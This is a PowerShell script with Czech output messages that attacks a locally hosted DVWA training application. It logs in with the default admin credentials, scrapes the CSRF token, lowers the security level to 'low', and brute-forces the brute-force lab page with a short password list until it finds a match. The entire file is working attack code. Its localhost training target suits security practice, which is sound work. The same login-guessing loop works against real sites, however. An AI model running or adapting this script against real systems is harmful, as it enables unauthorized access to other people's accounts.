$baseUrl     = "http://localhost/dvwa"
$loginUrl    = "$baseUrl/login.php"
$securityUrl = "$baseUrl/security.php"
$bruteUrl    = "$baseUrl/vulnerabilities/brute/"

$dvwaUser = "admin"
$dvwaPass = "password"
$targetUser = "admin"

$passwordList = @(
    "admin",
    "123456",
    "password"
)

Write-Host "[*] Krok 1: Načítám login stránku a CSRF token..." -ForegroundColor Cyan

$loginGet = Invoke-WebRequest -Uri $loginUrl -SessionVariable session -UseBasicParsing

$tokenPattern = @'
<input[^>]*name\s*=\s*["']user_token["'][^>]*value\s*=\s*["']([^"']+)["']
'@
$tokenMatch = [regex]::Match($loginGet.Content, $tokenPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase -bor [System.Text.RegularExpressions.RegexOptions]::Singleline)
if (-not $tokenMatch.Success) {
    Write-Host "[!] CSRF token nebyl nalezen na login stránce." -ForegroundColor Red
    exit 1
}
$userToken = $tokenMatch.Groups[1].Value

Write-Host "[*] Krok 2: Přihlašuji se..." -ForegroundColor Cyan
$loginBody = @{
    username   = $dvwaUser
    password   = $dvwaPass
    Login      = "Login"
    user_token = $userToken
}
$loginResponse = Invoke-WebRequest -Uri $loginUrl -Method Post -Body $loginBody -WebSession $session -UseBasicParsing

if ($loginResponse.Content -like "*Login :: Damn Vulnerable Web Application*") {
    Write-Host "[!] Přihlášení selhalo (stále na přihlašovací stránce)." -ForegroundColor Red
    exit 1
}
Write-Host "[+] Přihlášení úspěšné." -ForegroundColor Green

function Set-SecurityLevel {
    param(
        [string]$Level = 'low',
        [Microsoft.PowerShell.Commands.WebRequestSession]$Session,
        [string]$BaseUrl
    )

    try {
        $secPage = Invoke-WebRequest -Uri "$BaseUrl/security.php" -WebSession $Session -UseBasicParsing
        $tokenMatch = [regex]::Match($secPage.Content, $tokenPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase -bor [System.Text.RegularExpressions.RegexOptions]::Singleline)
        $token = if ($tokenMatch.Success) { $tokenMatch.Groups[1].Value } else { $null }

        $body = @{
            security = $Level
            seclev_submit = 'Submit'
        }
        if ($token) { $body.user_token = $token }

        $resp = Invoke-WebRequest -Uri "$BaseUrl/security.php" -Method Post -Body $body -WebSession $Session -UseBasicParsing

        $secCookie = $Session.Cookies.GetCookies($BaseUrl) | Where-Object { $_.Name -eq 'security' }
        if ($secCookie -and $secCookie.Value -ieq $Level) { return $true }

        $plain = $resp.Content -replace '<[^>]+>', ' '
        return ($plain -match "(?i)$Level")
    } catch {
        return $false
    }
}

Write-Host "[*] Nastavuji security level na 'low'..." -ForegroundColor Cyan
if (Set-SecurityLevel -Level 'low' -Session $session -BaseUrl $baseUrl) {
    Write-Host "[+] Security = low" -ForegroundColor Green
} else {
    Write-Warning "[!] Nepodařilo se ověřit nastavení security; pokračuji dál." -ForegroundColor Yellow
}

Write-Host "[*] Krok 3: Spouštím bruteforce proti $bruteUrl (uživatel: $targetUser)" -ForegroundColor Cyan
$found = $false

foreach ($pwd in $passwordList) {
    Write-Host "[-] Zkouším: $pwd" -NoNewline

    $uUser = [uri]::EscapeDataString($targetUser)
    $uPass = [uri]::EscapeDataString($pwd)
    $uri = "{0}?username={1}&password={2}&Login=Login" -f $bruteUrl, $uUser, $uPass

    $resp = Invoke-WebRequest -Uri $uri -Method Get -WebSession $session -UseBasicParsing
    $plain = $resp.Content -replace '<[^>]+>', ' '
    $plain = $plain -replace '\s+', ' '

    if ($plain -match '(?i)Welcome to the password protected area' -and $plain -match [regex]::Escape($targetUser)) {
        Write-Host " ... OK" -ForegroundColor Green
        Write-Host "[+] HESLO NALEZENO: $pwd" -ForegroundColor Green
        $found = $true
        break
    } else {
        Write-Host " ... Neúspěch" -ForegroundColor Gray
    }
    Start-Sleep -Milliseconds 150
}

if (-not $found) {
    Write-Host "[!] Správné heslo v seznamu nalezeno nebylo." -ForegroundColor Red
}